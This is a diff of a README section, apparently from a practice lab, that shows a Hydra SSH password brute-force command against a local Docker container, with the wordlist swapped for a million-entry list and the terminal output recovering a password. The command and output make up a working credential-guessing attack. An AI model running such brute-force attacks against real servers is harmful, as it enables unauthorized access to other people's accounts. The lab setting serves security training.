@@ -60,17 +60,20 @@ brute force docker with hydra
 ``hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222``
 
 ```bash
-ralex@ralex-nb:~$ hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222
+ralex@ralex-nb:/media/ralex/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/hack$ hydra -l sylvain -P ignis-1M.txt ssh://127.0.0.1:2222
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 20:39:24
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 23:59:46
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000000 login tries (l:1/p:1000000), ~62500 tries per task
 [DATA] attacking ssh://127.0.0.1:2222/
+[STATUS] 178.00 tries/min, 178 tries in 00:01h, 999824 to do in 93:37h, 16 active
 [2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 20:39:27
-ralex@ralex-nb:~$ 
+[WARNING] Writing restore file because 5 final worker threads did not complete until end.
+[ERROR] 5 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-26 00:01:20
 ```
 
 ## Author
